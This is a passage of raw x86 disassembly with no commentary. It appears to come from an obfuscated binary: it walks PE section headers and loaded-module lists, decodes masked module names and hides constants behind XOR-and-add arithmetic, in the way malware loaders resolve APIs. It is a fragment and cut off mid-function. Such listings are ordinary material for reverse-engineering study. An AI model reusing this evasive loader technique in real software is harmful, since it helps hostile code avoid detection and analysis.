  421e9a:	push   DWORD PTR [ebp+0x20]
  421e9d:	call   0x42161d
  421ea2:	test   eax,eax
  421ea4:	je     0x421f6d
  421eaa:	push   DWORD PTR [ebp+0xc]
  421ead:	mov    ecx,ebx
  421eaf:	push   DWORD PTR [ebp+0x20]
  421eb2:	call   0x421576
  421eb7:	test   eax,eax
  421eb9:	je     0x421f6d
  421ebf:	mov    eax,DWORD PTR [ebp+0xc]
  421ec2:	mov    edx,DWORD PTR [ebp+0x20]
  421ec5:	mov    ecx,ebx
  421ec7:	call   0x42144f
  421ecc:	test   eax,eax
  421ece:	je     0x421f6d
  421ed4:	push   ebx
  421ed5:	push   DWORD PTR [ebp+0x20]
  421ed8:	call   0x421900
  421edd:	test   eax,eax
  421edf:	je     0x421f6d
  421ee5:	mov    eax,DWORD PTR [ebx+0x18c]
  421eeb:	mov    edx,DWORD PTR [ebp+0x20]
  421eee:	cmp    edx,DWORD PTR [eax]
  421ef0:	jne    0x421f0c
  421ef2:	mov    eax,DWORD PTR [ebx+0x1e0]
  421ef8:	lea    ecx,[ebp-0x18]
  421efb:	push   ecx
  421efc:	push   DWORD PTR [ebp-0x18]
  421eff:	mov    ecx,DWORD PTR [ebp-0x20]
  421f02:	push   DWORD PTR [ecx+0x54]
  421f05:	push   edx
  421f06:	call   DWORD PTR [eax+0x1c]
  421f09:	mov    edx,DWORD PTR [ebp+0x20]
  421f0c:	mov    eax,DWORD PTR [ebx+0x1c8]
  421f12:	mov    eax,DWORD PTR [eax]
  421f14:	xor    eax,esi
  421f16:	add    eax,edi
  421f18:	je     0x421f51
  421f1a:	mov    ecx,DWORD PTR [ebp+0xc]
  421f1d:	mov    eax,DWORD PTR [ecx+0x28]
  421f20:	mov    DWORD PTR [ebp+0x8],0xf89ca5b5
  421f27:	mov    esi,DWORD PTR [ebp+0x8]
  421f2a:	push   DWORD PTR [ebp+0x14]
  421f2d:	xor    esi,0x8b3
  421f33:	push   DWORD PTR [ebp+0x10]
  421f36:	add    esi,0x72fa
  421f3c:	or     WORD PTR [ecx+0x16],si
  421f40:	add    eax,edx
  421f42:	push   edx
  421f43:	call   eax
  421f45:	mov    DWORD PTR [ebx+0x1d0],0xf89c85b4
  421f4f:	jmp    0x421f5b
  421f51:	mov    eax,DWORD PTR [ebp+0xc]
  421f54:	mov    eax,DWORD PTR [eax+0x28]
  421f57:	add    eax,edx
  421f59:	call   eax
  421f5b:	mov    DWORD PTR [ebp-0x8],eax
  421f5e:	mov    eax,DWORD PTR [ebp-0x8]
  421f61:	mov    ecx,DWORD PTR [ebp+0x1c]
  421f64:	mov    DWORD PTR [ecx],eax
  421f66:	mov    DWORD PTR [ebp-0x30],0x1
  421f6d:	cmp    DWORD PTR [ebp-0x30],0x0
  421f71:	jne    0x421f77
  421f73:	and    DWORD PTR [ebp+0x20],0x0
  421f77:	mov    eax,DWORD PTR [ebp+0x20]
  421f7a:	jmp    0x421f7e
  421f7c:	xor    eax,eax
  421f7e:	pop    edi
  421f7f:	pop    esi
  421f80:	pop    ebx
  421f81:	leave  
  421f82:	ret    0x1c
  421f85:	push   ebp
  421f86:	mov    ebp,esp
  421f88:	movzx  edx,WORD PTR [ecx+0x6]
  421f8c:	movzx  eax,WORD PTR [ecx+0x14]
  421f90:	push   ebx
  421f91:	push   edi
  421f92:	xor    edi,edi
  421f94:	lea    eax,[eax+ecx*1+0x18]
  421f98:	test   edx,edx
  421f9a:	je     0x421fbb
  421f9c:	mov    ecx,DWORD PTR [eax+0xc]
  421f9f:	lea    ebx,[ecx+esi*1]
  421fa2:	cmp    DWORD PTR [ebp+0x8],ebx
  421fa5:	jb     0x421fb3
  421fa7:	mov    ebx,DWORD PTR [eax+0x8]
  421faa:	add    ebx,ecx
  421fac:	add    ebx,esi
  421fae:	cmp    DWORD PTR [ebp+0x8],ebx
  421fb1:	jb     0x421fbd
  421fb3:	add    eax,0x28
  421fb6:	inc    edi
  421fb7:	cmp    edi,edx
  421fb9:	jb     0x421f9c
  421fbb:	xor    eax,eax
  421fbd:	pop    edi
  421fbe:	pop    ebx
  421fbf:	pop    ebp
  421fc0:	ret    0x4
  421fc3:	push   ebp
  421fc4:	mov    ebp,esp
  421fc6:	sub    esp,0x34
  421fc9:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  421fd0:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  421fd7:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  421fde:	mov    DWORD PTR [ebp-0x8],0xf89c85d4
  421fe5:	mov    DWORD PTR [ebp-0x20],0xf89c85f4
  421fec:	mov    DWORD PTR [ebp-0x2c],0xf89c8533
  421ff3:	mov    DWORD PTR [ebp-0x2c],0xf89c85d3
  421ffa:	mov    DWORD PTR [ebp-0x10],eax
  421ffd:	mov    eax,DWORD PTR [ebp+0x8]
  422000:	mov    DWORD PTR [ebp-0x14],eax
  422003:	mov    eax,DWORD PTR [ebp-0xc]
  422006:	push   ebx
  422007:	mov    ecx,0x75108b3
  42200c:	xor    eax,ecx
  42200e:	push   esi
  42200f:	mov    esi,DWORD PTR [ebp-0x10]
  422012:	mov    edx,0x3272fa
  422017:	add    eax,edx
  422019:	push   edi
  42201a:	cmp    esi,eax
  42201c:	je     0x4221fb
  422022:	mov    eax,DWORD PTR [ebp-0xc]
  422025:	mov    esi,DWORD PTR [ebp-0x14]
  422028:	xor    eax,ecx
  42202a:	add    eax,edx
  42202c:	cmp    esi,eax
  42202e:	je     0x4221fb
  422034:	mov    eax,DWORD PTR [ebp-0xc]
  422037:	xor    eax,ecx
  422039:	add    eax,edx
  42203b:	mov    DWORD PTR [ebp-0x24],eax
  42203e:	mov    eax,DWORD PTR [ebp-0xc]
  422041:	xor    eax,ecx
  422043:	add    eax,edx
  422045:	mov    DWORD PTR [ebp-0x28],eax
  422048:	mov    edi,DWORD PTR [ebp-0x20]
  42204b:	mov    ebx,DWORD PTR [ebp-0x8]
  42204e:	mov    esi,0x8b3
  422053:	xor    edi,esi
  422055:	mov    eax,0x72fa
  42205a:	xor    ebx,esi
  42205c:	add    edi,eax
  42205e:	add    ebx,eax
  422060:	sub    ebx,edi
  422062:	mov    WORD PTR [ebp-0x8],bx
  422066:	jmp    0x42212b
  42206b:	mov    edi,DWORD PTR [ebp-0xc]
  42206e:	mov    bx,WORD PTR [ebp-0x4]
  422072:	xor    edi,esi
  422074:	add    edi,eax
  422076:	cmp    bx,di
  422079:	je     0x42216d
  42207f:	mov    edi,DWORD PTR [ebp-0xc]
  422082:	mov    ebx,DWORD PTR [ebp+0xc]
  422085:	xor    edi,ecx
  422087:	add    edi,edx
  422089:	cmp    ebx,edi
  42208b:	mov    di,WORD PTR [ebp-0x4]
  42208f:	mov    bx,WORD PTR [ebp+0x8]
  422093:	je     0x4220fe
  422095:	cmp    bx,di
  422098:	je     0x422107
  42209a:	mov    edi,DWORD PTR [ebp-0x20]
  42209d:	mov    bx,WORD PTR [ebp+0x8]
  4220a1:	xor    edi,esi
  4220a3:	add    edi,eax
  4220a5:	cmp    bx,di
  4220a8:	jb     0x4220c8
  4220aa:	mov    edi,DWORD PTR [ebp-0x2c]
  4220ad:	mov    bx,WORD PTR [ebp+0x8]
  4220b1:	xor    edi,esi
  4220b3:	add    edi,eax
  4220b5:	cmp    bx,di
  4220b8:	ja     0x4220c8
  4220ba:	movzx  edi,WORD PTR [ebp+0x8]
  4220be:	movzx  ebx,WORD PTR [ebp-0x8]
  4220c2:	add    edi,ebx
  4220c4:	mov    WORD PTR [ebp+0x8],di
  4220c8:	mov    edi,DWORD PTR [ebp-0x20]
  4220cb:	mov    bx,WORD PTR [ebp-0x4]
  4220cf:	xor    edi,esi
  4220d1:	add    edi,eax
  4220d3:	cmp    bx,di
  4220d6:	jb     0x4220f6
  4220d8:	mov    edi,DWORD PTR [ebp-0x2c]
  4220db:	mov    bx,WORD PTR [ebp-0x4]
  4220df:	xor    edi,esi
  4220e1:	add    edi,eax
  4220e3:	cmp    bx,di
  4220e6:	ja     0x4220f6
  4220e8:	movzx  edi,WORD PTR [ebp-0x4]
  4220ec:	movzx  ebx,WORD PTR [ebp-0x8]
  4220f0:	add    edi,ebx
  4220f2:	mov    WORD PTR [ebp-0x4],di
  4220f6:	mov    di,WORD PTR [ebp-0x4]
  4220fa:	mov    bx,WORD PTR [ebp+0x8]
  4220fe:	cmp    bx,di
  422101:	jne    0x4221fb
  422107:	mov    edi,DWORD PTR [ebp-0x1c]
  42210a:	mov    ebx,DWORD PTR [ebp-0x10]
  42210d:	xor    edi,ecx
  42210f:	lea    edi,[edi+ebx*1+0x3272fa]
  422116:	mov    DWORD PTR [ebp-0x10],edi
  422119:	mov    edi,DWORD PTR [ebp-0x1c]
  42211c:	mov    ebx,DWORD PTR [ebp-0x14]
  42211f:	xor    edi,ecx
  422121:	lea    edi,[edi+ebx*1+0x3272fa]
  422128:	mov    DWORD PTR [ebp-0x14],edi
  42212b:	mov    edi,DWORD PTR [ebp-0x24]
  42212e:	mov    ebx,DWORD PTR [ebp-0x10]
  422131:	mov    di,WORD PTR [ebx+edi*2]
  422135:	mov    WORD PTR [ebp+0x8],di
  422139:	mov    edi,DWORD PTR [ebp-0x28]
  42213c:	mov    ebx,DWORD PTR [ebp-0x14]
  42213f:	mov    di,WORD PTR [ebx+edi*2]
  422143:	mov    WORD PTR [ebp-0x4],di
  422147:	mov    edi,DWORD PTR [ebp-0xc]
  42214a:	mov    bx,WORD PTR [ebp+0x8]
  42214e:	xor    edi,esi
  422150:	add    edi,eax
  422152:	cmp    bx,di
  422155:	jne    0x42206b
  42215b:	mov    eax,DWORD PTR [ebp-0x18]
  42215e:	mov    esi,DWORD PTR [ebp-0xc]
  422161:	xor    eax,ecx
  422163:	add    eax,edx
  422165:	imul   eax,esi
  422168:	mov    DWORD PTR [ebp-0xc],eax
  42216b:	jmp    0x42217f
  42216d:	mov    eax,DWORD PTR [ebp-0xc]
  422170:	mov    esi,DWORD PTR [ebp-0x18]
  422173:	xor    eax,ecx
  422175:	lea    eax,[eax+esi*1+0x3272fa]
  42217c:	mov    DWORD PTR [ebp-0x18],eax
  42217f:	mov    eax,DWORD PTR [ebp-0x24]
  422182:	sub    eax,edx
  422184:	xor    eax,ecx
  422186:	mov    DWORD PTR [ebp-0x30],eax
  422189:	mov    eax,DWORD PTR [ebp-0x28]
  42218c:	sub    eax,edx
  42218e:	xor    eax,ecx
  422190:	mov    DWORD PTR [ebp-0x34],eax
  422193:	mov    eax,DWORD PTR [ebp-0x34]
  422196:	mov    esi,DWORD PTR [ebp-0x1c]
  422199:	xor    esi,ecx
  42219b:	add    esi,edx
  42219d:	xor    eax,ecx
  42219f:	add    eax,0x3272fa
  4221a4:	imul   esi,eax
  4221a7:	mov    eax,DWORD PTR [ebp-0x14]
  4221aa:	movzx  eax,WORD PTR [esi+eax*1]
  4221ae:	mov    esi,DWORD PTR [ebp-0x30]
  4221b1:	mov    edi,DWORD PTR [ebp-0x1c]
  4221b4:	xor    esi,ecx
  4221b6:	add    esi,edx
  4221b8:	xor    edi,ecx
  4221ba:	add    edi,edx
  4221bc:	imul   edi,esi
  4221bf:	mov    esi,DWORD PTR [ebp-0x10]
  4221c2:	movzx  esi,WORD PTR [edi+esi*1]
  4221c6:	sub    eax,edx
  4221c8:	sub    esi,edx
  4221ca:	xor    eax,ecx
  4221cc:	xor    esi,ecx
  4221ce:	cmp    esi,eax
  4221d0:	jne    0x4221fb
  4221d2:	mov    eax,DWORD PTR [ebp-0x30]
  4221d5:	mov    esi,DWORD PTR [ebp-0x1c]
  4221d8:	xor    eax,ecx
  4221da:	add    eax,0x3272fa
  4221df:	xor    esi,ecx
  4221e1:	add    esi,edx
  4221e3:	imul   esi,eax
  4221e6:	mov    eax,DWORD PTR [ebp-0x10]
  4221e9:	movzx  eax,WORD PTR [esi+eax*1]
  4221ed:	mov    esi,DWORD PTR [ebp-0xc]
  4221f0:	sub    eax,edx
  4221f2:	xor    eax,ecx
  4221f4:	cmp    eax,esi
  4221f6:	mov    eax,DWORD PTR [ebp-0xc]
  4221f9:	je     0x4221fe
  4221fb:	mov    eax,DWORD PTR [ebp-0x18]
  4221fe:	pop    edi
  4221ff:	xor    eax,ecx
  422201:	pop    esi
  422202:	add    eax,edx
  422204:	pop    ebx
  422205:	leave  
  422206:	ret    0x8
  422209:	push   ebp
  42220a:	mov    ebp,esp
  42220c:	push   ecx
  42220d:	mov    cx,WORD PTR [eax]
  422210:	push   esi
  422211:	mov    esi,0x3b5f
  422216:	sub    cx,si
  422219:	mov    esi,0x8a9d
  42221e:	xor    cx,si
  422221:	mov    esi,0x4e3c
  422226:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42222d:	mov    edx,0xf89c85b5
  422232:	cmp    cx,si
  422235:	je     0x422294
  422237:	push   ebx
  422238:	push   edi
  422239:	movzx  ecx,cx
  42223c:	mov    edi,0xffcd8d06
  422241:	mov    esi,0x75108b3
  422246:	mov    ebx,0x4e60
  42224b:	cmp    cx,bx
  42224e:	jne    0x422253
  422250:	mov    DWORD PTR [ebp-0x4],edx
  422253:	lea    edx,[edi+0x1]
  422256:	xor    edx,esi
  422258:	mov    edi,edx
  42225a:	xor    edi,esi
  42225c:	mov    cx,WORD PTR [eax+edi*2+0x64e5f4]
  422264:	mov    ebx,0x3b5f
  422269:	sub    cx,bx
  42226c:	mov    ebx,0x8a9d
  422271:	xor    cx,bx
  422274:	mov    ebx,0x4e3c
  422279:	cmp    cx,bx
  42227c:	jne    0x422246
  42227e:	mov    ecx,DWORD PTR [ebp-0x4]
  422281:	pop    edi
  422282:	pop    ebx
  422283:	cmp    ecx,0xf89c85b6
  422289:	je     0x422294
  42228b:	xor    ecx,esi
  42228d:	lea    eax,[eax+ecx*2+0x64e5f6]
  422294:	pop    esi
  422295:	leave  
  422296:	ret    
  422297:	push   ebp
  422298:	mov    ebp,esp
  42229a:	push   ecx
  42229b:	push   esi
  42229c:	push   edi
  42229d:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  4222a4:	mov    esi,0xf89c85b5
  4222a9:	call   0x422209
  4222ae:	mov    edi,eax
  4222b0:	mov    al,BYTE PTR [edi]
  4222b2:	sub    al,0x6
  4222b4:	xor    al,0x81
  4222b6:	cmp    al,0x7b
  4222b8:	je     0x42231b
  4222ba:	mov    eax,edi
  4222bc:	mov    edx,0xffcd8d06
  4222c1:	mov    ecx,0x75108b3
  4222c6:	push   ebx
  4222c7:	mov    ax,WORD PTR [eax]
  4222ca:	mov    ebx,0x3b5f
  4222cf:	sub    ax,bx
  4222d2:	mov    ebx,0x8a9d
  4222d7:	xor    ax,bx
  4222da:	mov    ebx,0x4e52
  4222df:	cmp    ax,bx
  4222e2:	jne    0x4222e7
  4222e4:	mov    DWORD PTR [ebp-0x4],esi
  4222e7:	lea    esi,[edx+0x1]
  4222ea:	xor    esi,ecx
  4222ec:	mov    edx,esi
  4222ee:	xor    edx,ecx
  4222f0:	lea    eax,[edi+edx*2+0x64e5f4]
  4222f7:	mov    bl,BYTE PTR [eax]
  4222f9:	sub    bl,0x6
  4222fc:	xor    bl,0x81
  4222ff:	cmp    bl,0x7b
  422302:	jne    0x4222c7
  422304:	mov    eax,DWORD PTR [ebp-0x4]
  422307:	pop    ebx
  422308:	cmp    eax,0xf89c85b6
  42230d:	je     0x42231b
  42230f:	xor    eax,ecx
  422311:	xor    ecx,ecx
  422313:	mov    WORD PTR [edi+eax*2+0x64e5f4],cx
  42231b:	mov    eax,edi
  42231d:	pop    edi
  42231e:	pop    esi
  42231f:	leave  
  422320:	ret    
  422321:	push   ebp
  422322:	mov    ebp,esp
  422324:	push   ecx
  422325:	push   esi
  422326:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42232d:	mov    esi,0xf89c85b5
  422332:	call   0x422209
  422337:	mov    cx,WORD PTR [eax]
  42233a:	mov    edx,0x3b5f
  42233f:	sub    cx,dx
  422342:	mov    edx,0x8a9d
  422347:	xor    cx,dx
  42234a:	mov    edx,0x4e3c
  42234f:	cmp    cx,dx
  422352:	je     0x4223ab
  422354:	push   ebx
  422355:	push   edi
  422356:	movzx  ecx,cx
  422359:	mov    edx,0xffcd8d06
  42235e:	mov    edi,0x75108b3
  422363:	mov    ebx,0x4e52
  422368:	cmp    cx,bx
  42236b:	jne    0x422370
  42236d:	mov    DWORD PTR [ebp-0x4],esi
  422370:	lea    esi,[edx+0x1]
  422373:	xor    esi,edi
  422375:	mov    edx,esi
  422377:	xor    edx,edi
  422379:	mov    cx,WORD PTR [eax+edx*2+0x64e5f4]
  422381:	mov    ebx,0x3b5f
  422386:	sub    cx,bx
  422389:	mov    ebx,0x8a9d
  42238e:	xor    cx,bx
  422391:	mov    ebx,0x4e3c
  422396:	cmp    cx,bx
  422399:	jne    0x422363
  42239b:	cmp    DWORD PTR [ebp-0x4],0xf89c85b6
  4223a2:	pop    edi
  4223a3:	pop    ebx
  4223a4:	je     0x4223ab
  4223a6:	xor    eax,eax
  4223a8:	inc    eax
  4223a9:	jmp    0x4223ad
  4223ab:	xor    eax,eax
  4223ad:	pop    esi
  4223ae:	leave  
  4223af:	ret    
  4223b0:	push   ebp
  4223b1:	mov    ebp,esp
  4223b3:	push   ecx
  4223b4:	mov    eax,DWORD PTR [ebp+0x8]
  4223b7:	movzx  ecx,WORD PTR [eax]
  4223ba:	push   esi
  4223bb:	lea    eax,[ecx-0x3b5f]
  4223c1:	mov    esi,0x8a9d
  4223c6:	push   edi
  4223c7:	xor    eax,esi
  4223c9:	mov    edi,0x4e3c
  4223ce:	mov    DWORD PTR [ebp-0x4],edx
  4223d1:	cmp    ax,di
  4223d4:	je     0x422401
  4223d6:	mov    eax,DWORD PTR [ebp+0x8]
  4223d9:	sub    eax,edx
  4223db:	mov    DWORD PTR [ebp+0x8],eax
  4223de:	jmp    0x4223e3
  4223e0:	mov    eax,DWORD PTR [ebp+0x8]
  4223e3:	mov    WORD PTR [edx],cx
  4223e6:	add    edx,0x2
  4223e9:	movzx  edi,WORD PTR [eax+edx*1]
  4223ed:	mov    ecx,edi
  4223ef:	add    edi,0xffffc4a1
  4223f5:	xor    edi,esi
  4223f7:	mov    eax,0x4e3c
  4223fc:	cmp    di,ax
  4223ff:	jne    0x4223e0
  422401:	xor    eax,eax
  422403:	pop    edi
  422404:	mov    WORD PTR [edx],ax
  422407:	mov    eax,DWORD PTR [ebp-0x4]
  42240a:	pop    esi
  42240b:	leave  
  42240c:	ret    0x4
  42240f:	push   ebp
  422410:	mov    ebp,esp
  422412:	sub    esp,0x18
  422415:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  42241c:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  422423:	mov    ecx,DWORD PTR [ebp-0x8]
  422426:	push   esi
  422427:	mov    eax,0x75108b3
  42242c:	xor    ecx,eax
  42242e:	mov    esi,0x3272fa
  422433:	add    ecx,esi
  422435:	mov    DWORD PTR [ebp-0x4],ecx
  422438:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42243f:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  422446:	push   edi
  422447:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  42244e:	jmp    0x4224ef
  422453:	mov    ecx,DWORD PTR [ebp-0x4]
  422456:	mov    edx,DWORD PTR [ebp+0x10]
  422459:	sub    edx,ecx
  42245b:	mov    ecx,DWORD PTR [ebp-0xc]
  42245e:	xor    ecx,eax
  422460:	add    ecx,esi
  422462:	cmp    edx,ecx
  422464:	jbe    0x422481
  422466:	mov    edx,DWORD PTR [ebp-0x4]
  422469:	add    edx,DWORD PTR [ebp+0x8]
  42246c:	mov    ecx,DWORD PTR [ebp-0x4]
  42246f:	add    ecx,DWORD PTR [ebp+0xc]
  422472:	mov    edi,DWORD PTR [ecx]
  422474:	mov    DWORD PTR [edx],edi
  422476:	mov    ecx,DWORD PTR [ecx+0x4]
  422479:	mov    DWORD PTR [edx+0x4],ecx
  42247c:	mov    ecx,DWORD PTR [ebp-0xc]
  42247f:	jmp    0x4224ce
  422481:	mov    ecx,DWORD PTR [ebp-0x4]
  422484:	mov    edx,DWORD PTR [ebp+0x10]
  422487:	sub    edx,ecx
  422489:	mov    ecx,DWORD PTR [ebp-0x10]
  42248c:	xor    ecx,eax
  42248e:	add    ecx,esi
  422490:	cmp    edx,ecx
  422492:	mov    ecx,DWORD PTR [ebp-0x4]
  422495:	jbe    0x4224a9
  422497:	add    ecx,DWORD PTR [ebp+0x8]
  42249a:	mov    edx,DWORD PTR [ebp-0x4]
  42249d:	add    edx,DWORD PTR [ebp+0xc]
  4224a0:	mov    edx,DWORD PTR [edx]
  4224a2:	mov    DWORD PTR [ecx],edx
  4224a4:	mov    ecx,DWORD PTR [ebp-0x10]
  4224a7:	jmp    0x4224ce
  4224a9:	mov    edx,DWORD PTR [ebp+0x10]
  4224ac:	sub    edx,ecx
  4224ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4224b1:	xor    ecx,eax
  4224b3:	add    ecx,esi
  4224b5:	cmp    edx,ecx
  4224b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4224ba:	jbe    0x4224df
  4224bc:	add    ecx,DWORD PTR [ebp+0x8]
  4224bf:	mov    edx,DWORD PTR [ebp-0x4]
  4224c2:	add    edx,DWORD PTR [ebp+0xc]
  4224c5:	mov    dx,WORD PTR [edx]
  4224c8:	mov    WORD PTR [ecx],dx
  4224cb:	mov    ecx,DWORD PTR [ebp-0x14]
  4224ce:	mov    edx,DWORD PTR [ebp-0x4]
  4224d1:	xor    ecx,eax
  4224d3:	lea    ecx,[ecx+edx*1+0x3272fa]
  4224da:	mov    DWORD PTR [ebp-0x4],ecx
  4224dd:	jmp    0x4224ef
  4224df:	add    ecx,DWORD PTR [ebp+0x8]
  4224e2:	mov    edx,DWORD PTR [ebp-0x4]
  4224e5:	add    edx,DWORD PTR [ebp+0xc]
  4224e8:	mov    dl,BYTE PTR [edx]
  4224ea:	mov    BYTE PTR [ecx],dl
  4224ec:	inc    DWORD PTR [ebp-0x4]
  4224ef:	mov    ecx,DWORD PTR [ebp-0x18]
  4224f2:	mov    edx,DWORD PTR [ebp+0x10]
  4224f5:	xor    ecx,eax
  4224f7:	add    ecx,esi
  4224f9:	imul   ecx,edx
  4224fc:	mov    edx,DWORD PTR [ebp-0x8]
  4224ff:	mov    edi,DWORD PTR [ebp-0x4]
  422502:	xor    edx,eax
  422504:	lea    edx,[edx+edi*1+0x3272fa]
  42250b:	cmp    edx,ecx
  42250d:	jb     0x422453
  422513:	pop    edi
  422514:	pop    esi
  422515:	leave  
  422516:	ret    0xc
  422519:	push   ebp
  42251a:	mov    ebp,esp
  42251c:	sub    esp,0xc
  42251f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  422526:	push   esi
  422527:	mov    esi,eax
  422529:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  422530:	mov    edx,DWORD PTR [ebp-0x4]
  422533:	mov    eax,0x75108b3
  422538:	xor    edx,eax
  42253a:	mov    ecx,0x3272fa
  42253f:	add    edx,ecx
  422541:	cmp    esi,edx
  422543:	je     0x422585
  422545:	push   ebx
  422546:	push   edi
  422547:	mov    edx,DWORD PTR [ebp-0x8]
  42254a:	mov    ebx,DWORD PTR [ebp+0x8]
  42254d:	xor    edx,eax
  42254f:	mov    edi,0xffcd8d06
  422554:	sub    edi,edx
  422556:	add    esi,edi
  422558:	lea    edx,[esi-0x3272fa]
  42255e:	xor    edx,eax
  422560:	mov    DWORD PTR [ebp-0xc],edx
  422563:	mov    edx,DWORD PTR [ebp-0x4]
  422566:	mov    edi,DWORD PTR [ebp-0xc]
  422569:	xor    dl,0xb3
  42256c:	sub    dl,0x6
  42256f:	xor    edi,eax
  422571:	mov    BYTE PTR [edi+ebx*1+0x3272fa],dl
  422578:	mov    edx,DWORD PTR [ebp-0x4]
  42257b:	xor    edx,eax
  42257d:	add    edx,ecx
  42257f:	cmp    esi,edx
  422581:	jne    0x422547
  422583:	pop    edi
  422584:	pop    ebx
  422585:	pop    esi
  422586:	leave  
  422587:	ret    0x4
  42258a:	push   ebp
  42258b:	mov    ebp,esp
  42258d:	sub    esp,0x21c
  422593:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42259a:	mov    DWORD PTR [ebp-0x14],0xf89c85b4
  4225a1:	mov    eax,DWORD PTR [ebp+0x10]
  4225a4:	mov    eax,DWORD PTR [ebp-0x4]
  4225a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4225aa:	push   esi
  4225ab:	push   edi
  4225ac:	mov    edi,0x75108b3
  4225b1:	xor    eax,edi
  4225b3:	mov    esi,0x3272fa
  4225b8:	add    eax,esi
  4225ba:	cmp    eax,ecx
  4225bc:	mov    eax,DWORD PTR [ebp-0x4]
  4225bf:	jne    0x4225ca
  4225c1:	xor    eax,edi
  4225c3:	add    eax,esi
  4225c5:	jmp    0x422676
  4225ca:	mov    ecx,DWORD PTR [ebp+0xc]
  4225cd:	xor    eax,edi
  4225cf:	add    eax,esi
  4225d1:	cmp    eax,ecx
  4225d3:	jne    0x4225da
  4225d5:	mov    eax,DWORD PTR [ebp-0x4]
  4225d8:	jmp    0x4225c1
  4225da:	lea    eax,[ebp-0x21c]
  4225e0:	mov    DWORD PTR [ebp-0x8],eax
  4225e3:	mov    eax,DWORD PTR [ebp+0xc]
  4225e6:	mov    DWORD PTR [ebp-0x10],eax
  4225e9:	mov    eax,DWORD PTR [ebp-0x4]
  4225ec:	xor    eax,edi
  4225ee:	add    eax,esi
  4225f0:	mov    DWORD PTR [ebp+0x10],eax
  4225f3:	mov    eax,DWORD PTR [ebp+0xc]
  4225f6:	push   ebx
  4225f7:	call   0x422321
  4225fc:	mov    ebx,eax
  4225fe:	mov    eax,DWORD PTR [ebp+0x8]
  422601:	mov    eax,DWORD PTR [eax+0x14]
  422604:	jmp    0x42265e
  422606:	mov    eax,DWORD PTR [ebp+0xc]
  422609:	sub    eax,0x8
  42260c:	mov    DWORD PTR [ebp-0xc],eax
  42260f:	mov    eax,DWORD PTR [ebp-0xc]
  422612:	mov    eax,DWORD PTR [eax+0x28]
  422615:	call   0x422209
  42261a:	mov    DWORD PTR [ebp+0x10],eax
  42261d:	push   DWORD PTR [ebp+0x10]
  422620:	mov    edx,DWORD PTR [ebp-0x8]
  422623:	call   0x4223b0
  422628:	mov    eax,DWORD PTR [ebp-0x4]
  42262b:	xor    eax,edi
  42262d:	add    eax,esi
  42262f:	cmp    eax,ebx
  422631:	jne    0x42263b
  422633:	mov    eax,DWORD PTR [ebp-0x8]
  422636:	call   0x422297
  42263b:	mov    eax,DWORD PTR [ebp-0x14]
  42263e:	xor    eax,edi
  422640:	add    eax,esi
  422642:	push   eax
  422643:	push   DWORD PTR [ebp-0x10]
  422646:	mov    eax,DWORD PTR [ebp-0x8]
  422649:	call   0x421fc3
  42264e:	mov    ecx,DWORD PTR [ebp-0x4]
  422651:	xor    ecx,edi
  422653:	add    ecx,esi
  422655:	cmp    eax,ecx
  422657:	je     0x42267c
  422659:	mov    eax,DWORD PTR [ebp+0xc]
  42265c:	mov    eax,DWORD PTR [eax]
  42265e:	mov    DWORD PTR [ebp+0xc],eax
  422661:	mov    eax,DWORD PTR [ebp+0x8]
  422664:	mov    ecx,DWORD PTR [ebp+0xc]
  422667:	add    eax,0x14
  42266a:	cmp    ecx,eax
  42266c:	jne    0x422606
  42266e:	mov    eax,DWORD PTR [ebp-0x4]
  422671:	xor    eax,edi
  422673:	add    eax,esi
  422675:	pop    ebx
  422676:	pop    edi
  422677:	pop    esi
  422678:	leave  
  422679:	ret    0xc
  42267c:	mov    eax,DWORD PTR [ebp-0xc]
  42267f:	mov    eax,DWORD PTR [eax+0x18]
  422682:	jmp    0x422675
  422684:	push   ebp
  422685:	mov    ebp,esp
  422687:	mov    eax,DWORD PTR [ebp+0xc]
  42268a:	sub    esp,0x10
  42268d:	cmp    DWORD PTR [ebp+0x8],0x0
  422691:	push   ebx
  422692:	push   esi
  422693:	push   edi
  422694:	je     0x422749
  42269a:	test   eax,eax
  42269c:	je     0x422749
  4226a2:	movzx  eax,WORD PTR [eax+0x20]
  4226a6:	mov    ecx,eax
  4226a8:	mov    DWORD PTR [ebp-0x10],eax
  4226ab:	xor    edx,edx
  4226ad:	and    DWORD PTR [ebp-0x8],edx
  4226b0:	mov    eax,0x8a9d
  4226b5:	xor    ecx,eax
  4226b7:	add    ecx,0x3b5f
  4226bd:	mov    DWORD PTR [ebp-0xc],ecx
  4226c0:	and    DWORD PTR [ebp-0x4],0x0
  4226c4:	xor    ecx,ecx
  4226c6:	push   0x7d
  4226c8:	pop    edi
  4226c9:	cmp    cx,WORD PTR [ebp-0xc]
  4226cd:	jae    0x422733
  4226cf:	lea    esi,[edx-0x3b5f]
  4226d5:	xor    esi,eax
  4226d7:	movzx  ecx,WORD PTR [ebp-0x4]
  4226db:	mov    ebx,DWORD PTR [ebp+0xc]
  4226de:	lea    ecx,[ebx+ecx*4]
  4226e1:	cmp    WORD PTR [ecx+0x2],si
  4226e5:	jne    0x42271e
  4226e7:	movzx  ecx,WORD PTR [ecx]
  4226ea:	mov    edi,0x4e3c
  4226ef:	cmp    cx,di
  4226f2:	jne    0x422700
  4226f4:	mov    ebx,DWORD PTR [ebp+0x8]
  4226f7:	movzx  edi,dx
  4226fa:	cmp    BYTE PTR [edi+ebx*1],0x0
  4226fe:	je     0x42272d
  422700:	mov    ebx,DWORD PTR [ebp+0x8]
  422703:	movzx  edi,dx
  422706:	movsx  di,BYTE PTR [edi+ebx*1]
  42270b:	mov    ebx,0x3b5f
  422710:	sub    di,bx
  422713:	xor    di,ax
  422716:	cmp    cx,di
  422719:	je     0x42272d
  42271b:	push   0x7b
